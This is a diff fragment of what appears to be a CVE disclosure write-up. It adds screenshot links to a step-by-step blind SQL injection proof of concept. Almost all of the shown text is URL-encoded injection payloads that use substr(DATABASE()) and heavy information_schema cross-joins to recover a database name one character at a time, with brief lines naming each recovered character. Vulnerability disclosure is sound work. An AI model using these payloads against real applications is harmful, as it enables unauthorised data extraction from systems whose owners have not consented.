@@ -33,12 +33,15 @@ The third digit is the character _
 ```
 1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
 ```
+![image](https://github.com/Bobjones7/cve/assets/127505769/3ed54e93-861c-45c0-aba9-ae7f4aad8306)
 
 The fourth digit is the character o
 
 ```
 1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
 ```
+![image](https://github.com/Bobjones7/cve/assets/127505769/00c652f1-53ae-439a-bea1-dcd14ad97497)
+
 The fifth digit is the character a
 ```
 1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
